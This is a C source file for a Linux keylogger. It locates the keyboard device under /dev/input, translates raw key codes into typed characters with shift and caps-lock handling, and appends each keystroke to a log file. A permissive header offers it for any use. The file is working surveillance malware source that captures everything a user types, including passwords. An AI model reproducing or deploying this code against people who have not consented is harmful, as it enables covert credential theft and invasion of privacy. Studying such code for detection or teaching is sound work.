/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary libraries for functioning
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <linux/input.h>
#include <fcntl.h>
#include "keylog.h"

//defining directory where to find keyboard files
#define DEVICE_DIRECTORY "/dev/input/"

/*
@param takes a directory entry structure
@return int success (0) or fail(1)
This function goes and ends up verifying that the specific file 
is an event file by checking if it is a character device
and that the file name has the word 'event' in it
*/
static int isEventFile(const struct dirent *file){
    //if character device and has 
    if((file->d_type == DT_CHR) && (strstr(file->d_name, "event"))){
        return 1;
    }

    return 0;
}


/*
@param an empty buffer where the path to the keyboard event file will be stored
This program goes through event files and determines the first instance of 
keyboard event file and writes the path to the passed in buffer.
*/
void detectKeyboard(char * fileNameBuffer){

    //necessary variable creation
    struct dirent **file_listing;
    int num_files;
    char filename[270];

    //identifing the number of files in directory and passing all the directory items into the pointer to sturct dirent pointer
    num_files = scandir(DEVICE_DIRECTORY, &file_listing, &isEventFile, &alphasort);
    if(num_files == -1){
        exit(-1);
    }

    //looping through each event file and ...
    for(int i = 0; i < num_files; i++){
        int32_t event_bitmap = 0;
        int fd;
        int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

        //format filename
        snprintf(filename, sizeof(filename), "%s%s", DEVICE_DIRECTORY, file_listing[i]->d_name);

        printf("Trying %s\n", filename);

        //open the sus event file
        fd = open(filename, O_RDONLY);
        if(fd == -1){
            continue;
        }

        //gather the event bitmap and verify it is 0x120013
        ioctl(fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
        if((EV_KEY & event_bitmap) == EV_KEY){
            if((event_bitmap & 0x120013) == 0x120013){
                free(file_listing);
                strncpy(fileNameBuffer, filename, sizeof(filename));
                return;
            }
        }

        close(fd);
        
    }
}

/*
@param a logfile path and a character
@return int success(0) failure (-1)
This function given a logfile and a key that was just 
pressed will write that key to the location of the file
based on the provided file path.
*/
int logKeyStroke(char * LOGFILE, char * key){
    //open a pointer to the LOFfile
    FILE *fp = fopen(LOGFILE, "a+");
    if(fp == NULL){
        return -1;
    }

    //write key to logfile
    fprintf(fp, "%s", key);
    fclose(fp);

    return 0;
}

/*
@param event code which determines a key press by event file,
 int boolean determing if shift is held or if capslock has been 
 toggled on
@return The key that was pressed as a character
This goes in and evaluates based on the event code, wheter or not the shift
was held, and even if caps lock was toggled to determine which key the user
had pressed and which character they had typed up.

*/
char * mapButtonRelease(int event_code, int shiftHeld, int capsLock)
{
    char * keyPressed;
    
    //switch cases when shift is held down but capslock is not
    if((shiftHeld == 1) && (capsLock == 0)){
        switch(event_code){
            case 2:
                keyPressed = "!";
                break;
            case 3:
                keyPressed = "@";
                break;
            case 4:
                keyPressed = "#";
                break;
            case 5:
                keyPressed = "$";
                break;
            case 6:
                keyPressed = "%%";
                break;
            case 7:
                keyPressed = "^";
                break;
            case 8:
                keyPressed = "&";
                break;
            case 9:
                keyPressed = "*";
                break;
            case 10:
                keyPressed = "(";
                break;
            case 11:
                keyPressed = ")";
                break;
            case 12:
                keyPressed = "_";
                break;
            case 13:
                keyPressed = "+";
                break;
            case 14:
                keyPressed = "\b";
                break;
            case 15:
                keyPressed = "\t";
                break;
            case 16:
                keyPressed = "Q";
                break;
            case 17:
                keyPressed = "W";
                break;
            case 18:
                keyPressed = "E";
                break;
            case 19:
                keyPressed = "R";
                break;
            case 20:
                keyPressed = "T";
                break;
            case 21:
                keyPressed = "Y";
                break;
            case 22:
                keyPressed = "U";
                break;
            case 23:
                keyPressed = "I";
                break;
            case 24:
                keyPressed = "O";
                break;
            case 25:
                keyPressed = "P";
                break;
            case 26:
                keyPressed = "{";
                break;
            case 27:
                keyPressed = "}";
                break;
            case 28:
                keyPressed = "\n";
                break;
            case 30:
                keyPressed = "A";
                break;
            case 31:
                keyPressed = "S";
                break;
            case 32:
                keyPressed = "D";
                break;
            case 33:
                keyPressed = "F";
                break;
            case 34:
                keyPressed = "G";
                break;
            case 35:
                keyPressed = "H";
                break;
            case 36:
                keyPressed = "J";
                break;
            case 37:
                keyPressed = "K";
                break;
            case 38:
                keyPressed = "L";
                break;
            case 39:
                keyPressed = ":";
                break;
            case 40:
                keyPressed = "\"";
                break;
            case 41:
                keyPressed = "~";
                break;     
            case 43:
                keyPressed = "|";
                break;       
            case 44:
                keyPressed = "Z";
                break;   
            case 45:
                keyPressed = "X";
                break;   
            case 46:
                keyPressed = "C";
                break;   
            case 47:
                keyPressed = "V";
                break;   
            case 48:
                keyPressed = "B";
                break;   
            case 49:
                keyPressed = "N";
                break;   
            case 50:
                keyPressed = "M";
                break;   
            case 51:
                keyPressed = "<";
                break;   
            case 52:
                keyPressed = ">";
                break;   
            case 53:
                keyPressed = "?";
                break;   
            case 57:
                keyPressed = " ";     
                break;  
            default:
                keyPressed = "";
        }
    }

    //switch case if neither shift or caps lock is on
    else if((shiftHeld == 0) && (capsLock == 0)){
        switch(event_code){
            case 2:
                keyPressed = "1";
                break;
            case 3:
                keyPressed = "2";
                break;
            case 4:
                keyPressed = "3";
                break;
            case 5:
                keyPressed = "4";
                break;
            case 6:
                keyPressed = "5";
                break;
            case 7:
                keyPressed = "6";
                break;
            case 8:
                keyPressed = "7";
                break;
            case 9:
                keyPressed = "8";
                break;
            case 10:
                keyPressed = "9";
                break;
            case 11:
                keyPressed = "0";
                break;
            case 12:
                keyPressed = "-";
                break;
            case 13:
                keyPressed = "=";
                break;
            case 14:
                keyPressed = "\b";
                break;
            case 15:
                keyPressed = "\t";
                break;
            case 16:
                keyPressed = "q";
                break;
            case 17:
                keyPressed = "w";
                break;
            case 18:
                keyPressed = "e";
                break;
            case 19:
                keyPressed = "r";
                break;
            case 20:
                keyPressed = "t";
                break;
            case 21:
                keyPressed = "y";
                break;
            case 22:
                keyPressed = "u";
                break;
            case 23:
                keyPressed = "i";
                break;
            case 24:
                keyPressed = "o";
                break;
            case 25:
                keyPressed = "p";
                break;
            case 26:
                keyPressed = "[";
                break;
            case 27:
                keyPressed = "]";
                break;
            case 28:
                keyPressed = "\n";
                break;
            case 30:
                keyPressed = "a";
                break;
            case 31:
                keyPressed = "s";
                break;
            case 32:
                keyPressed = "d";
                break;
            case 33:
                keyPressed = "f";
                break;
            case 34:
                keyPressed = "g";
                break;
            case 35:
                keyPressed = "h";
                break;
            case 36:
                keyPressed = "j";
                break;
            case 37:
                keyPressed = "k";
                break;
            case 38:
                keyPressed = "l";
                break;
            case 39:
                keyPressed = ";";
                break;
            case 40:
                keyPressed = "'";
                break;
            case 41:
                keyPressed = "`";
                break;    
            case 43:
                keyPressed = "\\";
                break;       
            case 44:
                keyPressed = "z";
                break;   
            case 45:
                keyPressed = "x";
                break;   
            case 46:
                keyPressed = "c";
                break;   
            case 47:
                keyPressed = "v";
                break;   
            case 48:
                keyPressed = "b";
                break;   
            case 49:
                keyPressed = "n";
                break;   
            case 50:
                keyPressed = "m";
                break;   
            case 51:
                keyPressed = ",";
                break;   
            case 52:
                keyPressed = ".";
                break;   
            case 53:
                keyPressed = "/";
                break;   
            case 57:
                keyPressed = " ";     
                break;  
            default:
                keyPressed = "";
        }
    }

    //switch case if both shift and capslock are engaged
    else if((shiftHeld == 1) && (capsLock == 1)){
        switch(event_code){
            case 2:
                keyPressed = "!";
                break;
            case 3:
                keyPressed = "@";
                break;
            case 4:
                keyPressed = "#";
                break;
            case 5:
                keyPressed = "$";
                break;
            case 6:
                keyPressed = "%%";
                break;
            case 7:
                keyPressed = "^";
                break;
            case 8:
                keyPressed = "&";
                break;
            case 9:
                keyPressed = "*";
                break;
            case 10:
                keyPressed = "(";
                break;
            case 11:
                keyPressed = ")";
                break;
            case 12:
                keyPressed = "_";
                break;
            case 13:
                keyPressed = "+";
                break;
            case 14:
                keyPressed = "\b";
                break;
            case 15:
                keyPressed = "\t";
                break;
            case 16:
                keyPressed = "q";
                break;
            case 17:
                keyPressed = "w";
                break;
            case 18:
                keyPressed = "e";
                break;
            case 19:
                keyPressed = "r";
                break;
            case 20:
                keyPressed = "t";
                break;
            case 21:
                keyPressed = "y";
                break;
            case 22:
                keyPressed = "u";
                break;
            case 23:
                keyPressed = "i";
                break;
            case 24:
                keyPressed = "o";
                break;
            case 25:
                keyPressed = "p";
                break;
            case 26:
                keyPressed = "{";
                break;
            case 27:
                keyPressed = "}";
                break;
            case 28:
                keyPressed = "\n";
                break;
            case 30:
                keyPressed = "a";
                break;
            case 31:
                keyPressed = "s";
                break;
            case 32:
                keyPressed = "d";
                break;
            case 33:
                keyPressed = "f";
                break;
            case 34:
                keyPressed = "g";
                break;
            case 35:
                keyPressed = "h";
                break;
            case 36:
                keyPressed = "j";
                break;
            case 37:
                keyPressed = "k";
                break;
            case 38:
                keyPressed = "l";
                break;
            case 39:
                keyPressed = ":";
                break;
            case 40:
                keyPressed = "\"";
                break;
            case 41:
                keyPressed = "~";
                break;     
            case 43:
                keyPressed = "|";
                break;       
            case 44:
                keyPressed = "z";
                break;   
            case 45:
                keyPressed = "x";
                break;   
            case 46:
                keyPressed = "c";
                break;   
            case 47:
                keyPressed = "v";
                break;   
            case 48:
                keyPressed = "b";
                break;   
            case 49:
                keyPressed = "n";
                break;   
            case 50:
                keyPressed = "m";
                break;   
            case 51:
                keyPressed = "<";
                break;   
            case 52:
                keyPressed = ">";
                break;   
            case 53:
                keyPressed = "?";
                break;   
            case 57:
                keyPressed = " ";     
                break; 
            default:
                keyPressed = "";
        }
    }

    //switch case if shift is not held but capslock is engaged
    else if((shiftHeld == 0) && (capsLock == 1)){
        switch(event_code){
            case 2:
                keyPressed = "1";
                break;
            case 3:
                keyPressed = "2";
                break;
            case 4:
                keyPressed = "3";
                break;
            case 5:
                keyPressed = "4";
                break;
            case 6:
                keyPressed = "5";
                break;
            case 7:
                keyPressed = "6";
                break;
            case 8:
                keyPressed = "7";
                break;
            case 9:
                keyPressed = "8";
                break;
            case 10:
                keyPressed = "9";
                break;
            case 11:
                keyPressed = "0";
                break;
            case 12:
                keyPressed = "-";
                break;
            case 13:
                keyPressed = "=";
                break;
            case 14:
                keyPressed = "\b";
                break;
            case 15:
                keyPressed = "\t";
                break;
            case 16:
                keyPressed = "Q";
                break;
            case 17:
                keyPressed = "W";
                break;
            case 18:
                keyPressed = "E";
                break;
            case 19:
                keyPressed = "R";
                break;
            case 20:
                keyPressed = "T";
                break;
            case 21:
                keyPressed = "Y";
                break;
            case 22:
                keyPressed = "U";
                break;
            case 23:
                keyPressed = "I";
                break;
            case 24:
                keyPressed = "O";
                break;
            case 25:
                keyPressed = "P";
                break;
            case 26:
                keyPressed = "[";
                break;
            case 27:
                keyPressed = "]";
                break;
            case 28:
                keyPressed = "\n";
                break;
            case 30:
                keyPressed = "A";
                break;
            case 31:
                keyPressed = "S";
                break;
            case 32:
                keyPressed = "D";
                break;
            case 33:
                keyPressed = "F";
                break;
            case 34:
                keyPressed = "G";
                break;
            case 35:
                keyPressed = "H";
                break;
            case 36:
                keyPressed = "J";
                break;
            case 37:
                keyPressed = "K";
                break;
            case 38:
                keyPressed = "L";
                break;
            case 39:
                keyPressed = ";";
                break;
            case 40:
                keyPressed = "'";
                break;
            case 41:
                keyPressed = "`";
                break;  
            case 43:
                keyPressed = "\\";
                break;       
            case 44:
                keyPressed = "Z";
                break;   
            case 45:
                keyPressed = "X";
                break;   
            case 46:
                keyPressed = "C";
                break;   
            case 47:
                keyPressed = "V";
                break;   
            case 48:
                keyPressed = "B";
                break;   
            case 49:
                keyPressed = "N";
                break;   
            case 50:
                keyPressed = "M";
                break;  
            case 51:
                keyPressed = ",";
                break;   
            case 52:
                keyPressed = ".";
                break;   
            case 53:
                keyPressed = "/";
                break;
            case 57:
                keyPressed = " ";     
                break;
            default:
                keyPressed = "";
        }
    }
    
    //returning the key that was pressed.
    return keyPressed;
}